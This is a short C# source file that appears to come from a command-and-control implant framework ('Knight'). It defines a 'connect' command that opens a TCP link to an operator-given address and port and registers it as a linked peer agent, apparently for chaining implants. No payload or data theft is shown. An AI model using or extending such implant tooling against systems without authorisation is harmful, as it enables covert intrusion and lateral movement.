using Knight.Models.Comm;
using Knight.Models.Raven;
using System;

namespace Knight.Commands
{
    public class Connect : KnightCommand
    {
        public override string Name => "connect";

        public override string Execute(TaskMessage task)
        {
            var remoteAddress = task.Arguments[0];
            var remotePort = Int32.Parse(task.Arguments[1]);

            AllyCommModule commModule = new TcpCommModule(remoteAddress, remotePort);

            Knight.AddChildAlly(task.TaskId, commModule);

            return $"Started Tcp Client for {remoteAddress}:{remotePort}";
        }
    }
}
